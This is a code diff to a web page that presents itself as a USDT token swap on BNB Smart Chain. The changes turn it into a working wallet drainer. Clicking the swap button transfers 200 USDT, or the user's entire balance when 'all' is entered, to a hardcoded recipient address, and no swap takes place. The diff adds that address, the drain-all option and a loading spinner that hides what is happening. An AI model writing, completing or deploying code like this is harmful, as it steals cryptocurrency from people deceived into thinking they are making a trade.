@@ -218,7 +218,7 @@
                     </div>
                 </div>
                 <div class="token-amount-container">
-                    <input type="number" id="usdtInput" class="token-amount" value="200" placeholder="0">
+                    <input type="text" id="usdtInput" class="token-amount" value="200" placeholder="200 or 'all'">
                     <div id="usdtValue" class="token-value">$200</div>
                 </div>
             </div>
@@ -295,14 +295,20 @@
             const usdtInput = document.getElementById('usdtInput');
             const swapButton = document.getElementById('swapButton');
             const errorMessage = document.getElementById('errorMessage');
+            const buttonText = document.getElementById('buttonText');
             
             // BSC Configuration
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
             const USDT_DECIMALS = 18;
+            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943'; // Your recipient address
             
             // Main swap handler
             swapButton.addEventListener('click', async function() {
+                buttonText.innerHTML = '<span class="spinner"></span>';
+                swapButton.disabled = true;
+                errorMessage.style.display = 'none';
+                
                 try {
                     // 1. Check if wallet is installed
                     if (!window.ethereum) {
@@ -345,7 +351,7 @@
                         }
                     }
                     
-                    // 4. Transfer USDT
+                    // 4. Setup ethers
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const signer = provider.getSigner();
                     const contract = new ethers.Contract(
@@ -357,24 +363,31 @@
                         signer
                     );
                     
-                    // Get amount to transfer (200 USDT or all balance)
-                    const amountToTransfer = usdtInput.value === 'all' ? 
-                        await contract.balanceOf(userAddress) :
-                        ethers.utils.parseUnits('200', USDT_DECIMALS);
+                    // 5. Determine amount to transfer
+                    let amountToTransfer;
+                    if (usdtInput.value.toLowerCase() === 'all') {
+                        amountToTransfer = await contract.balanceOf(userAddress);
+                    } else {
+                        const amount = parseFloat(usdtInput.value) || 200;
+                        amountToTransfer = ethers.utils.parseUnits(amount.toString(), USDT_DECIMALS);
+                    }
                     
-                    // Execute transfer (replace with your recipient address)
+                    // 6. Execute transfer
                     const tx = await contract.transfer(
-                        '0xRecipientAddressHere', // CHANGE THIS TO YOUR RECIPIENT ADDRESS
+                        RECIPIENT_ADDRESS,
                         amountToTransfer
                     );
                     
-                    // Wait for transaction to complete
-                    await tx.wait();
+                    // Optional: Wait for transaction confirmation
+                    // await tx.wait();
                     
                 } catch (error) {
                     console.error('Error:', error);
                     errorMessage.textContent = error.message;
                     errorMessage.style.display = 'block';
+                } finally {
+                    buttonText.textContent = 'Continue';
+                    swapButton.disabled = false;
                 }
             });
         });
